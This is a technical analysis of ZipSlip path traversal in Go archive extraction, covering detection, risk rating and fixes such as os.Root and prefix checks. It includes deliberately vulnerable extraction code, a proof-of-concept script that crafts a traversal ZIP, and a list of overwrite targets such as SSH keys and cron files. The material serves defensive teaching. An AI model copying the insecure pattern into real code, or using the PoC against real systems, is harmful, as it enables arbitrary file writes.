# **Unsafe Compression Libraries (ZipSlip) in Golang: A Technical Analysis**

## **Vulnerability Title**

Unsafe Archive Decompression Leading to Path Traversal (ZipSlip)

## **Severity Rating**

**High🟠 to Critical🔴**

The severity of ZipSlip vulnerabilities is generally considered High to Critical. This is supported by CVSS scores typically ranging from 7.8 to 8.1 for specific instances. For example, CVE-2025-3445, affecting `mholt/archiver`, has a CVSS 3.1 score of 8.1. The OWASP Risk Rating Methodology, when applied, also tends to result in a High or Critical rating due to the potential for arbitrary file write, leading to Remote Code Execution (RCE).

## **Description**

ZipSlip is a path traversal vulnerability that occurs when an application insecurely extracts files from an archive (e.g., ZIP, TAR). If the application fails to validate the file paths of entries within the archive, an attacker can craft a malicious archive containing directory traversal sequences (e.g., `../`) or symlinks. Upon extraction, these malicious entries can cause files to be written to arbitrary locations on the filesystem, outside of the intended destination directory. This can lead to overwriting critical system files, application files, or planting malicious executables, often resulting in remote code execution.

## **Technical Description (for security pros)**

The ZipSlip vulnerability arises from inadequate path validation during the extraction of compressed archives. Archive formats like ZIP and TAR store not only file data but also metadata, including filenames and paths. An attacker can manipulate these filenames to include path traversal sequences (e.g., `../../../../etc/passwd`) or create symbolic links pointing to sensitive locations.

When a vulnerable application processes such an archive, it typically iterates through each entry, constructs a destination path by concatenating a base extraction directory with the entry's filename, and then writes the entry's content to this path. The vulnerability manifests if the application does not properly sanitize or validate the entry's filename before this concatenation and write operation.

For example, if the target extraction directory is `/var/www/uploads/` and an archive contains an entry named `../../../../tmp/evil.sh`, a naive extraction process might resolve this to `/var/www/uploads/../../../../tmp/evil.sh`, which canonicalizes to `/tmp/evil.sh`. The application, intending to write within its designated upload space, inadvertently writes to an arbitrary location on the filesystem.

The core of the issue lies in trusting the file paths provided within the archive. Even if `filepath.Clean` is used, it might not prevent traversal if the logic doesn't ensure the cleaned path remains within the intended base directory. Symlinks within archives present another vector; an archive might contain a symlink like `link_to_root` pointing to `/`, and then another entry `link_to_root/etc/passwd`, allowing an attacker to write to `/etc/passwd`.

The Go standard library's `archive/zip` and `archive/tar` packages, in versions prior to certain updates or without specific GODEBUG flags, did not inherently prevent these issues, placing the onus of secure path handling on the developer. Later Go versions introduced `ErrInsecurePath` and, more robustly, `os.Root` to mitigate these risks.

## **Common Mistakes That Cause This**

1. **Trusting Archive File Names:** Assuming that filenames within an archive are safe and do not contain malicious path components.
    
2. **Insufficient Path Sanitization:** Relying solely on simple string replacements or inadequate cleaning functions that don't fully neutralize traversal sequences (e.g., `../`, `..\`) or handle all path encodings.
3. **Incorrect Use of `filepath.Join` and `filepath.Clean`:** Using `filepath.Join` to combine a destination directory with a filename from an archive, and then using `filepath.Clean`, without subsequently verifying that the resulting path is still prefixed by the intended destination directory. `filepath.Clean` normalizes paths but doesn't inherently prevent traversal out of a base directory if not used correctly.
    
4. **Ignoring `ErrInsecurePath`:** In Go versions 1.20 and later, `archive/zip` and `archive/tar` may return `ErrInsecurePath` for unsafe paths. Ignoring this error without proper custom sanitization leads to the vulnerability.
    
5. **Not Using `os.Root`:** In Go 1.24 and later, failing to use the `os.Root` API for archive extraction, which is designed to confine file operations within a specific directory, thus preventing path traversal.

6. **Improper Symlink Handling:** Extracting symbolic links without validating their targets. A symlink could point outside the intended extraction directory, and subsequent file writes using that symlink could lead to arbitrary file placement.

7. **Vulnerable Third-Party Libraries:** Using older or unpatched versions of archive handling libraries that have known ZipSlip vulnerabilities (e.g., older versions of `mholt/archiver`).
    
8. **Lack of Output Path Confinement:** After constructing the full path for an extracted file, failing to check if this path is still within the intended, secure parent directory. A common mistake is not ensuring `strings.HasPrefix(cleanedPath, cleanedDestDir)`.
    
## **Exploitation Goals**

The primary goals of exploiting a ZipSlip vulnerability include:

1. **Arbitrary File Write/Overwrite:** The most direct goal is to write or overwrite files anywhere on the filesystem that the vulnerable application has write permissions for. This can include:

    - Overwriting critical system files (e.g., `/etc/passwd`, system binaries) to cause damage or manipulate system behavior.
    - Overwriting application configuration files (e.g., `web.xml`, `.env`) to change application settings, disable security features, or point to attacker-controlled resources.
    - Overwriting application binaries or scripts to inject malicious code.
2. **Remote Code Execution (RCE):** This is often the ultimate goal. By overwriting executable files, scripts (e.g., `.php`, `.jsp`, `.sh`), or configuration files that control code execution (e.g., cron jobs, web server module configurations), an attacker can achieve RCE.

3. **Privilege Escalation:** If the vulnerable application runs with elevated privileges (e.g., as root or an administrator), successfully exploiting ZipSlip allows the attacker to write files with those same privileges, potentially leading to full system compromise.
    
4. **Data Exfiltration:** While not a direct result of the file write, attackers can plant scripts or tools that, once executed (via RCE), can exfiltrate sensitive data from the compromised system.
5. **Denial of Service (DoS):** Overwriting essential system or application files can render the system or application unstable or completely unavailable.
    
6. **Planting Backdoors:** Writing files like web shells or SSH authorized keys to maintain persistent access to the compromised system.

## **Affected Components or Files**

- **Go Standard Library:**
    - `archive/zip`: Vulnerable if path validation is not correctly implemented by the developer. Go versions 1.20+ introduce `ErrInsecurePath`, and 1.24+ introduces `os.Root` for safer handling.

    - `archive/tar`: Similar to `archive/zip`, developer diligence is required. It also benefits from `ErrInsecurePath` and `os.Root` in newer Go versions.

- **Third-Party Libraries:**
    - `github.com/mholt/archiver`: Versions prior to the fix for CVE-2025-3445 are vulnerable to ZipSlip via symlinks in ZIP files and potentially TAR files (CVE-2024-0406). The project is deprecated in favor of `github.com/mholt/archives`.
        
    - Other Go libraries that wrap or implement archive extraction without proper path validation. The vulnerability is widespread across languages and libraries if not handled correctly.
        
- **Target Files for Overwrite/Creation (Examples):**
    - **Configuration Files:** `.bashrc`, `.profile`, web server configurations (e.g., Apache's `.htaccess` or `httpd.conf` if writable), application-specific config files.
    - **Executable Files/Scripts:** Shell scripts in `PATH` directories, web server script directories (e.g., CGI bins), application binaries.
    - **System Files:** `/etc/passwd`, `/etc/shadow` (if running as root), cron job files (`/etc/cron.d/`, user crontabs).
    - **Web Root Files:** Planting web shells (e.g., `backdoor.php` in `/var/www/html/`).
        
    - **SSH Keys:** `~/.ssh/authorized_keys` to gain SSH access.
        
    - **Log Files:** Potentially to inject malicious content that might be processed later.
    - **Temporary Files:** Overwriting temporary files used by other processes might lead to unexpected behavior or further exploitation.

## **Vulnerable Code Snippet**

The following Go code snippet demonstrates a vulnerable way to extract files from a ZIP archive using the standard `archive/zip` package. This code is susceptible to ZipSlip because it does not adequately validate the file paths within the archive before writing them to the disk.

```Go

package main

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings" // Added for a naive, insufficient check
)

// insecureUnzip extracts files from a zip archive to destDir.
// This function is VULNERABLE to ZipSlip.
func insecureUnzip(zipFilePath string, destDir string) error {
	r, err := zip.OpenReader(zipFilePath)
	if err!= nil {
		return fmt.Errorf("failed to open zip: %w", err)
	}
	defer r.Close()

	// Ensure the destination directory exists
	if err := os.MkdirAll(destDir, 0755); err!= nil {
		return fmt.Errorf("failed to create destination directory: %w", err)
	}

	for _, f := range r.File {
		// Construct the full path for the file to be extracted
		// THIS IS THE CRITICAL POINT FOR THE VULNERABILITY
		filePath := filepath.Join(destDir, f.Name)

		// A common but INSUFFICIENT attempt to sanitize:
		// filepath.Clean will resolve ".." but won't prevent writing outside destDir
		// if the overall path is still valid, e.g., /tmp/file if destDir is /var/app and f.Name is../../../tmp/file
		// Also, simply checking for ".." in f.Name is not enough due to encodings or complex paths.
		if strings.Contains(f.Name, "..") {
			fmt.Printf("Skipping potentially malicious path: %s\n", f.Name)
			continue 
            // This check is easily bypassed, e.g. by using absolute paths if not handled, or symlinks.
		}
        
        // Log the path we intend to write to
		fmt.Printf("Extracting to: %s\n", filePath)

		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(filePath, f.Mode()); err!= nil {
				return fmt.Errorf("failed to create directory %s: %w", filePath, err)
			}
			continue
		}

		// Create the file
		outFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err!= nil {
			return fmt.Errorf("failed to open file %s for writing: %w", filePath, err)
		}

		rc, err := f.Open()
		if err!= nil {
			outFile.Close() // Close outFile before returning
			return fmt.Errorf("failed to open file in zip %s: %w", f.Name, err)
		}

		_, err = io.Copy(outFile, rc)
		
		// Close files explicitly
		outFile.Close()
		rc.Close()

		if err!= nil {
			return fmt.Errorf("failed to copy content to %s: %w", filePath, err)
		}
	}
	return nil
}

func main() {
	// Example usage:
	// Assume "malicious.zip" is a crafted archive and "output_dir" is the target.
	// This is for demonstration; in a real scenario, zipFilePath and destDir would come from user input or configuration.
	err := insecureUnzip("path/to/your/malicious.zip", "output_dir")
	if err!= nil {
		fmt.Printf("Error: %v\n", err)
	} else {
		fmt.Println("Unzip completed (potentially with malicious writes).")
	}
}
```

**Why this is vulnerable 11:**

1. `filepath.Join(destDir, f.Name)`: If `f.Name` contains `../` sequences (e.g., `../../../../tmp/payload.txt`), `filepath.Join` will construct a path that, when cleaned by the OS or subsequent `filepath.Clean` (if it were used, though not explicitly here for the check), could point outside of `destDir`.
2. The `strings.Contains(f.Name, "..")` check is naive. It can be bypassed if the path traversal doesn't use `..` directly in `f.Name` but relies on symlinks within the archive, or if `f.Name` is an absolute path (e.g., `/etc/passwd`) and the application runs with sufficient privileges.
3. No check is performed to ensure that the final `filePath` is still prefixed by `destDir` after path resolution.
4. This code does not leverage newer Go features like `os.Root` or explicitly handle `ErrInsecurePath` which would provide better protection.

## **Detection Steps**

Detecting ZipSlip vulnerabilities involves a combination of static analysis, dynamic analysis, and manual code review.

1. **Static Application Security Testing (SAST):**
    - Use Go-specific SAST tools like `gosec`. `gosec` includes rule G305: "File traversal when extracting zip/tar archive," which specifically targets this vulnerability pattern. It looks for insecure usage of archive extraction functions where file paths from the archive are used without proper sanitization.
        
    - Other SAST tools may also identify path traversal vulnerabilities by tracking tainted data (the filename from the archive) to sensitive file system operations (like `os.OpenFile` or `ioutil.WriteFile`).
        
    - Look for linters or static analysis checks that flag the use of `filepath.Join` with potentially unsafe inputs without subsequent validation that the path remains within a trusted root directory.
        
2. **Manual Code Review:**
    - Identify all code sections that handle archive (ZIP, TAR, etc.) extraction.
    - Scrutinize how filenames from archive entries (`zip.File.Name`, `tar.Header.Name`) are processed.
    - Verify that for each extracted file, the full destination path is constructed safely.
    - Ensure that after any path cleaning (`filepath.Clean`), a check is performed to confirm the path is still prefixed by the intended, secure base extraction directory (e.g., using `strings.HasPrefix`).

    - Check if the code uses `os.Root` (Go 1.24+) for extraction, which is the most secure method.
        
    - Check if the code handles `ErrInsecurePath` (Go 1.20+) returned by standard library archive readers.

    - Review how symbolic links are handled. Are they disallowed, or are their targets also validated?.
        
3. **Dynamic Application Security Testing (DAST):**
    - If the application has a feature that accepts archive uploads, test it by uploading crafted archives containing path traversal sequences (e.g., filenames like `../../../../tmp/test.txt`) and symlinks pointing outside the intended directory.

    - Monitor the file system to see if files are created or overwritten in unintended locations.
    - Tools like Hackvertor can be used to generate malicious zip files for testing file upload functionalities.
        
4. **Dependency Scanning:**
    - Use tools like Snyk, JFrog Xray, or `govulncheck` to identify if any third-party archive handling libraries used in the project have known ZipSlip vulnerabilities (e.g., CVE-2025-3445 in `mholt/archiver`).

5. **Reviewing GODEBUG Flags:**
    - Check if `GODEBUG=zipinsecurepath=1` or `tarinsecurepath=1` is set, as this would disable the default `ErrInsecurePath` protection in Go 1.20+ for the respective archive types, potentially re-enabling vulnerabilities if the code relies on this default protection.

## **Proof of Concept (PoC)**

This Proof of Concept demonstrates the ZipSlip vulnerability using Go's standard `archive/zip` package with insecure extraction logic.

**Objective:** Create a malicious ZIP file that, when extracted by a vulnerable Go program, writes a file outside the intended destination directory.

**Step 1: Create a Malicious ZIP File (`create_malicious_zip.py`)**

This Python script creates `malicious.zip` containing an entry that attempts to traverse directories.

```Python

import zipfile
import os

def create_malicious_zip(zip_path, traversal_path, content):
    """
    Creates a malicious zip file.
    zip_path: Path to save the.zip file.
    traversal_path: The path including traversal (e.g., "../../../tmp/malicious_file.txt").
    content: The content of the malicious file.
    """
    with zipfile.ZipFile(zip_path, 'w') as zf:
        # Add a benign file (optional, makes archive look more normal)
        zf.writestr("benign.txt", "This is a safe file.")

        # Add the malicious file with path traversal
        # Note: Some zip tools/libraries might clean this on creation.
        # A more robust method for some archivers involves symlink_info as in.[1]
        # For a simple path traversal in filename:
        zf.writestr(traversal_path, content.encode('utf-8')) # Ensure content is bytes
    print(f"Malicious zip created at {zip_path} targeting {traversal_path}")

if __name__ == "__main__":
    # Target a common, writable directory. Adjust for your OS.
    # For *nix:
    target_file_relative_path = "../../../tmp/zip_slip_poc.txt"
    # For Windows (example, be careful with paths):
    # target_file_relative_path = "..\\..\\..\\Users\\Public\\zip_slip_poc.txt"

    create_malicious_zip("malicious.zip", target_file_relative_path, "ZipSlip PoC successful!")

```

*Running this script will generate `malicious.zip` in the current directory.*

**Step 2: Create a Vulnerable Go Application (`vuln_unzip.go`)**

This application uses the `insecureUnzip` function similar to the one in Section 8.

```Go

package main

import (
	"archive/zip"
	"fmt"
	"io"
	"os"
	"path/filepath"
	// "strings" // Not using the naive check from snippet for clearer PoC
)

// insecureUnzip extracts files from a zip archive to destDir.
// This function is VULNERABLE to ZipSlip.
func insecureUnzip(zipFilePath string, destDir string) error {
	r, err := zip.OpenReader(zipFilePath)
	if err!= nil {
		return fmt.Errorf("failed to open zip: %w", err)
	}
	defer r.Close()

	if err := os.MkdirAll(destDir, 0755); err!= nil {
		return fmt.Errorf("failed to create destination directory: %w", err)
	}

	for _, f := range r.File {
		filePath := filepath.Join(destDir, f.Name) // Vulnerable path construction
        
        // CRITICAL: No validation to ensure filePath stays within destDir
        // For example, filepath.Clean here might resolve ".." but the path could still be outside.
        // A proper check would be:
        // cleanedDestDir := filepath.Clean(destDir)
        // cleanedFilePath := filepath.Clean(filePath)
        // if!strings.HasPrefix(cleanedFilePath, cleanedDestDir+string(os.PathSeparator)) && cleanedFilePath!= cleanedDestDir {
        //     return fmt.Errorf("illegal file path: %s", f.Name)
        // }

		fmt.Printf("Attempting to extract: %s to %s\n", f.Name, filePath)

		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(filePath, f.Mode()); err!= nil {
				return fmt.Errorf("failed to create directory %s: %w", filePath, err)
			}
			continue
		}

		outFile, err := os.OpenFile(filePath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, f.Mode())
		if err!= nil {
			return fmt.Errorf("failed to open file %s for writing: %w", filePath, err)
		}

		rc, err := f.Open()
		if err!= nil {
			outFile.Close()
			return fmt.Errorf("failed to open file in zip %s: %w", f.Name, err)
		}

		_, err = io.Copy(outFile, rc)
		
		outFile.Close()
		rc.Close()

		if err!= nil {
			return fmt.Errorf("failed to copy content to %s: %w", filePath, err)
		}
		fmt.Printf("Successfully extracted %s\n", f.Name)
	}
	return nil
}

func main() {
	destDir := "output_dir" // Intended extraction directory
	fmt.Printf("Attempting to unzip malicious.zip into %s\n", destDir)

	// Ensure malicious.zip is in the same directory or provide full path
	err := insecureUnzip("malicious.zip", destDir)
	if err!= nil {
		fmt.Printf("Error during unzip: %v\n", err)
		// Even if an error occurs for one file, others might have been processed.
	} else {
		fmt.Println("Unzip operation completed.")
	}

	// Check if the malicious file was created outside output_dir
	// This path corresponds to target_file_relative_path in the Python script,
	// relative to where 'go run' is executed if output_dir is relative.
	// For simplicity, we assume 'go run' is in the same dir as 'output_dir' would be.
	// The actual path of zip_slip_poc.txt will be /tmp/zip_slip_poc.txt
	// if target_file_relative_path was "../../../tmp/zip_slip_poc.txt"
	// and destDir was "./output_dir"
	
    var maliciousFileCheckPath string
    // Determine the absolute path for checking, assuming destDir is relative to CWD
    absDestDir, _ := filepath.Abs(destDir)
    // The traversal was../../../tmp/zip_slip_poc.txt relative to the file inside the zip,
    // which itself is joined to destDir.
    // So, if destDir is /path/to/cwd/output_dir, and f.Name is../../../tmp/zip_slip_poc.txt
    // filePath becomes /path/to/cwd/output_dir/../../../tmp/zip_slip_poc.txt
    // which simplifies to /tmp/zip_slip_poc.txt
    maliciousFileCheckPath = "/tmp/zip_slip_poc.txt" // For *nix example
    // For Windows, adjust based on target_file_relative_path, e.g.:
    // maliciousFileCheckPath = "C:\\Users\\Public\\zip_slip_poc.txt"

	if _, err := os.Stat(maliciousFileCheckPath); err == nil {
		fmt.Printf("SUCCESS: Malicious file found at %s\n", maliciousFileCheckPath)
		// Clean up the created malicious file
		os.Remove(maliciousFileCheckPath) 
	} else {
		fmt.Printf("Malicious file NOT found at %s (Error: %v). Check paths and permissions.\n", maliciousFileCheckPath, err)
	}
    // Clean up output_dir
    os.RemoveAll(destDir)
}
```

**Step 3: Compile and Run**

1. Save the Python script as `create_malicious_zip.py` and the Go code as `vuln_unzip.go`.
2. Run the Python script to create the archive: `python create_malicious_zip.py`
3. Run the Go application: `go run vuln_unzip.go`

**Expected Outcome:**

- The `output_dir` directory will be created in the current working directory.
- The `benign.txt` file will be extracted into `output_dir/benign.txt`.
- The `zip_slip_poc.txt` file will be created in `/tmp/zip_slip_poc.txt` (on Unix-like systems) or the corresponding traversed path on Windows, NOT inside `output_dir`.
- The Go program's output will indicate whether the malicious file was found at the traversed location.

This PoC effectively demonstrates that the `insecureUnzip` function allows a crafted ZIP file to write outside its designated extraction directory, confirming the ZipSlip vulnerability. The successful creation of `zip_slip_poc.txt` in an unintended location is the evidence of the exploit.

## **Risk Classification**

The risk posed by ZipSlip vulnerabilities is assessed using the OWASP Risk Rating Methodology, which considers Likelihood and Impact.

**Likelihood Factors:**

| **Factor Category** | **Specific Factor** | **Selected Score (1-9)** | **Justification for Score** |
| --- | --- | --- | --- |
| **Threat Agent** | Skill Level | 5 | Crafting malicious archives requires advanced computer user skills; tools can lower this. |
|  | Motive | 9 | High reward: RCE, data theft, system compromise. |
|  | Opportunity | 7 | Some access required (e.g., ability to upload an archive to a vulnerable system). |
|  | Size | 9 | Anonymous internet users can often supply archives to public-facing applications. |
| **Vulnerability** | Ease of Discovery | 7 | SAST tools (like `gosec` G305) can detect it; manual review can find it if archive handling is obvious. |
|  | Ease of Exploit | 7 | Publicly available PoCs and understanding of archive structures make exploitation relatively easy. |
|  | Awareness | 9 | ZipSlip is a well-documented, publicly known vulnerability class. |
|  | Intrusion Detection | 8 | File writes to unexpected locations might not be logged or trigger alerts unless specific monitoring is in place. |
| **Overall Likelihood** |  | **7.75 (High)** | Calculated as average of the sub-factor scores. |

**Impact Factors:**

| **Factor Category** | **Specific Factor** | **Selected Score (1-9)** | **Justification for Score** |
| --- | --- | --- | --- |
| **Technical Impact** | Loss of Confidentiality | 7 | Extensive critical data disclosed if sensitive configuration files or data stores are read/exposed. |
|  | Loss of Integrity | 9 | All data can be totally corrupted; arbitrary file write can lead to RCE, meaning complete system integrity loss. |
|  | Loss of Availability | 7 | Extensive primary services interrupted if critical system/application files are overwritten or deleted. |
|  | Loss of Accountability | 7 | Actions might be traceable to the application's user, but attacker identity can be obscured. |
| **Business Impact** | Financial Damage | 7 | Significant effect on annual profit (recovery costs, data breach fines, service outage). |
| *(Organizational* | Reputation Damage | 7 | Significant brand damage and loss of customer trust. |
| *Assessment)* | Non-Compliance | 7 | High profile violation (e.g., GDPR, CCPA if PII is compromised). |
|  | Privacy Violation | 7 | Thousands of people potentially affected if user data is compromised. |
| **Overall Impact** |  | **7.5 (High)** | Calculated as average of technical impact scores (business impact is contextual but generally high). |

**Overall Risk Calculation:**

Using the OWASP Risk Rating table (Likelihood x Impact):

- Likelihood: High (7.75)
- Impact: High (7.5)
- **Overall Risk: Critical**

The potential for Remote Code Execution means that even with a moderate likelihood, the impact is severe enough to classify the risk as high or critical in most contexts. The CVSS scores for known ZipSlip vulnerabilities (e.g., 8.1 for CVE-2025-3445) align with this high-critical assessment. The widespread nature of archive processing makes many systems potentially susceptible if secure coding practices are not followed.

## **Fix & Patch Guidance**

Addressing ZipSlip vulnerabilities in Go applications requires careful validation of file paths during archive extraction and leveraging modern Go features designed for security.

1. **Secure Path Construction and Validation (Most Critical):**
    - **Canonicalize and Clean Paths:** For every file entry from an archive, construct the full intended path by joining it with a secure base destination directory (e.g., `targetPath := filepath.Join(destDir, entry.Name)`). Subsequently, clean this path using `cleanedPath := filepath.Clean(targetPath)`. This step helps normalize the path, resolving `.` and `..` components.
    - **Prefix Verification:** After cleaning, it is crucial to verify that the `cleanedPath` is still within the intended `destDir`. This is typically done by checking if `cleanedPath` starts with the cleaned `destDir` path:
    
    This check ensures that traversal sequences have not resulted in a path outside the target directory.
    
        ```Go
        
        import "strings"
        import "os"
        import "path/filepath"
        
        //...
        cleanedDestDir := filepath.Clean(destDir)
        if!strings.HasPrefix(cleanedPath, cleanedDestDir+string(os.PathSeparator)) && cleanedPath!= cleanedDestDir {
            // Path is outside the intended destination directory; reject this entry.
            return fmt.Errorf("unsafe path: %s attempts to write outside of %s", entry.Name, destDir)
        }
        ```
    - **Consider `filepath.Rel`:** The `filepath.Rel(basepath, targpath)` function can be used to find a relative path. If `targpath` is not within `basepath`, it will return an error or a path starting with `../`, which can be an indicator of traversal.
        
2. **Utilize `os.Root` (Go 1.24+):**
    - The `os.Root` type, introduced in Go 1.24, provides the most robust solution. It creates a file system view restricted to a specific directory. All file operations (create, open, etc.) performed through an `os.Root` object are automatically constrained within that root, inherently preventing path traversal via `../` or symbolic links.
        
    - Example:
        
        ```Go
        
        root, err := os.OpenRoot(destDir)
        if err!= nil { /* handle error */ }
        defer root.Close()
        //...
        file, err := root.Create(entry.Name) // entry.Name is relative to destDir
        // This operation is confined within destDir.
        ```
        
3. **Handle `ErrInsecurePath` (Go 1.20+):**
    - When using `archive/zip.OpenReader`, `archive/zip.NewReader`, or `archive/tar.NewReader`, Go versions 1.20 and later (by default, or if `GODEBUG=zipinsecurepath=0` / `tarinsecurepath=0` is set) will return `zip.ErrInsecurePath` or `tar.ErrInsecurePath` if an archive entry contains an absolute path or `../` components.

    - Code *must* check for and appropriately handle this error, typically by rejecting the archive or the specific malicious entry. Ignoring this error without secure custom handling negates the protection.
4. **Use `filepath.IsLocal` (Go 1.20+):**
    - Before joining an entry name with the destination directory, `filepath.IsLocal(entry.Name)` can be used as a preliminary check. It verifies if `entry.Name` is a "local" path (i.e., does not escape its evaluation directory, is not absolute, and is not a reserved name on Windows). This should be combined with prefix validation after joining with the *target* extraction directory.
        
5. **Update and Use Secure Libraries:**
    - If using third-party libraries like `mholt/archiver`, migrate to maintained and secure alternatives such as `mholt/archives`, which is not affected by CVE-2025-3445. The `hashicorp/go-extract` library is also designed with security against path traversal in mind.
        
    - Always keep dependencies updated and monitor them for security advisories.
6. **Secure Symbolic Link Handling:**
    - Establish a clear policy for handling symbolic links within archives. Generally, it's safest to disallow their extraction.
    - If symlinks must be extracted, their target paths must also undergo the same rigorous validation (canonicalization, prefix check) to ensure they point within the destination directory. `os.Root` handles symlink traversal securely by confining operations within its defined root.
        
7. **Resource Consumption Limits:**
    - To protect against "Zip Bombs" (archives designed to exhaust resources), implement limits on the total uncompressed size of extracted data and the total number of files extracted from a single archive.
        
By implementing these measures, developers can significantly reduce the risk of ZipSlip vulnerabilities. The introduction of `os.Root` in Go 1.24 marks a significant improvement in providing secure-by-default primitives for such operations.

## **Scope and Impact**

Scope:

The ZipSlip vulnerability can affect any Golang application that processes and extracts files from archives (such as ZIP, TAR, JAR, WAR, etc.) where the archive's origin is untrusted or could be compromised. This includes a wide range of applications:

- Web applications with file upload functionalities that accept archives.
- Build systems and CI/CD pipelines that process build artifacts.
- Data ingestion systems that receive archived data from external sources.
- Any utility or service that programmatically unpacks archives.
The vulnerability is present if the application uses the Go standard library's `archive/zip` or `archive/tar` packages without correct path validation, or if it employs vulnerable third-party archive handling libraries. While the vulnerability's mechanism is platform-independent, the specific files an attacker might target (e.g., `/etc/passwd` on Linux versus `C:\Windows\system.ini` on Windows) are OS-dependent.

Impact:

A successful ZipSlip exploitation can have severe consequences:

1. **Loss of Confidentiality:** If an attacker overwrites configuration files or plants tools, they might gain access to sensitive data stored on the server or within the application (e.g., database credentials, API keys, user data).

2. **Loss of Integrity:** This is a primary impact. Attackers can achieve arbitrary file write, allowing them to:
    - Corrupt critical system or application data.
    - Overwrite legitimate application files or system binaries with malicious versions.
    - Plant malware, backdoors (like web shells), or ransomware on the server.
    This often leads directly to Remote Code Execution (RCE), giving the attacker control over the application's behavior and potentially the underlying server.

3. **Loss of Availability:** Overwriting essential system files, application binaries, or configuration files can render the application or the entire server unstable or completely inoperable, leading to a Denial of Service (DoS) condition.

4. **Privilege Escalation:** If the vulnerable Go application is running with elevated privileges (e.g., as `root` on Unix-like systems or `Administrator` on Windows), an attacker exploiting ZipSlip can write files with these same high privileges. This can allow the attacker to escalate their privileges on the system, potentially gaining full administrative control.
    
5. **Complete System Takeover:** In the most severe cases, particularly when RCE is achieved with high privileges, the attacker can gain complete control over the compromised server.

The broad applicability of archive extraction functionalities combined with the severe potential impact (especially RCE and privilege escalation) makes ZipSlip a critical vulnerability that demands careful attention and robust mitigation. The existence of this vulnerability pattern across many programming languages and libraries for years highlights the subtleties involved in secure archive handling.

## **Remediation Recommendation**

A multi-layered approach is recommended to remediate and prevent ZipSlip vulnerabilities in Golang applications.

1. **Prioritize Library Updates & Secure Alternatives:**
    - **Go Version:** Ensure the application is built with Go 1.20 or later to benefit from the `ErrInsecurePath` error signaling in `archive/zip` and `archive/tar`. Ideally, use Go 1.24 or later to leverage the `os.Root` API for the most secure extraction.
        
    - **Third-Party Libraries:** If using `github.com/mholt/archiver`, immediately migrate to its maintained successor, `github.com/mholt/archives`, which is not affected by CVE-2025-3445. For other third-party libraries, check for security advisories and update to patched versions. Consider libraries explicitly designed for secure extraction, like `hashicorp/go-extract`.
        
2. **Implement Robust Path Validation for All Archive Extraction Code:**
    - **Adopt `os.Root` (Go 1.24+):** This is the preferred and most secure method. Refactor existing code or write new code to use `os.OpenRoot(destDir)` and perform all file creation and writing operations through the returned `os.Root` object. This inherently confines operations to `destDir`.

    - **If `os.Root` is Not Available (Go <1.24):**
        - **Handle `ErrInsecurePath` (Go 1.20+):** Explicitly check for `zip.ErrInsecurePath` or `tar.ErrInsecurePath` when opening/reading archives. Treat this error as fatal for the problematic entry or the entire archive.
        
        - **Strict Path Sanitization and Prefix Check:** For every entry, construct the full path using `filepath.Join(destDir, entry.Name)`. Clean it with `filepath.Clean()`. Then, critically, verify that the cleaned path is still prefixed by the cleaned `destDir` (e.g., `strings.HasPrefix(cleanedPath, filepath.Clean(destDir) + string(os.PathSeparator))`). Reject any entry that fails this check.
        - Use `filepath.IsLocal(entry.Name)` as an initial filter, but do not rely on it solely without the subsequent join and prefix check against the target directory.
            
3. **Conduct Thorough Code Audits & Security Testing:**
    - **SAST:** Integrate Static Application Security Testing tools like `gosec` into the CI/CD pipeline. Specifically enable and monitor for rule G305 ("File traversal when extracting zip/tar archive").
    - **Manual Code Reviews:** Focus on all archive extraction routines, paying close attention to path construction, sanitization, and validation logic.
    - **DAST:** Perform Dynamic Application Security Testing by attempting to upload and extract maliciously crafted archives designed to exploit ZipSlip.
4. **Developer Training and Awareness:**
    - Educate developers about the risks of path traversal, the ZipSlip vulnerability pattern, and secure file handling practices in Go.
    - Ensure they are aware of and correctly use Go's newer security features like `ErrInsecurePath` and `os.Root`.
5. **Enforce Principle of Least Privilege:**
    - Ensure that the Go application handling archive extraction runs with the minimum necessary file system permissions. This can limit the impact even if a vulnerability is exploited.
6. **Continuous Monitoring and Dependency Management:**
    - Employ automated dependency scanning tools (e.g., `govulncheck`, Snyk) to continuously monitor for new vulnerabilities in archive-related libraries.
    - Monitor application logs for errors related to file operations during archive extraction or any `ErrInsecurePath` occurrences.

By systematically applying these recommendations, organizations can significantly reduce their exposure to ZipSlip vulnerabilities. The evolution of Go's standard library to include more secure primitives underscores the importance of staying current with language versions and adopting best practices.

## **Summary**

ZipSlip is a critical path traversal vulnerability that arises from insecurely extracting files from archives in Golang applications. Attackers can craft malicious archive entries containing relative path sequences (`../`) or symbolic links. If an application fails to properly validate these paths, it can be tricked into writing files outside the intended destination directory. This can lead to severe consequences, including arbitrary file overwrite, Remote Code Execution (RCE), privilege escalation, and Denial of Service (DoS).

Common mistakes contributing to this vulnerability include trusting archive filenames, insufficient path sanitization (e.g., improper use of `filepath.Clean` without subsequent prefix checks), ignoring Go's `ErrInsecurePath` error, and insecure handling of symbolic links.

Detection methods involve Static Application Security Testing (SAST) tools like `gosec` (specifically rule G305), manual code reviews focusing on archive extraction logic, Dynamic Application Security Testing (DAST) with crafted malicious archives, and dependency scanning for vulnerable libraries.

Remediation is centered on robust path validation. For Go 1.24+, using the `os.Root` API is the most secure approach as it inherently confines file operations. For earlier Go versions (1.20+), diligently checking for and handling `ErrInsecurePath` is crucial. In all cases, a combination of `filepath.Join`, `filepath.Clean`, and a strict `strings.HasPrefix` check to ensure the final path remains within the target directory is essential if not using `os.Root`. Updating vulnerable third-party libraries, such as migrating from `mholt/archiver` to `mholt/archives`, is also a key step.

Given its potential for high impact, often leading to full system compromise, ZipSlip vulnerabilities must be addressed with high priority through secure coding practices, diligent testing, and ongoing developer education.
